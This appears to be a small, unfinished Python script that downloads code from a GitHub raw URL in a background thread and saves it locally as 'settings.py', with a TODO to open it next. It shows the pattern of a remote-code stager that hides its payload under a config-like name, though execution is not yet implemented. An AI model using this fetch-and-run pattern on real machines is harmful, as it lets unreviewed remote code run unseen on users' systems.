from requests import get
from threading import Thread
from os import system
from os.path import exists

url = 'https://raw.githubusercontent.com/LifeIsACage/soc_project/main/py_to_download.py'
file_name = 'settings.py'

#TODO - Open py file

def start_downloading():
    th1=Thread(target=download_code)
    th1.daemon = True
    th1.start()

def download_code():
    data = get(url)
    dataText = data.text

    f1= open(file_name, 'w')
    f1.write(dataText)
    f1.close()

    start_code()

def start_code():

    print("Starting Code")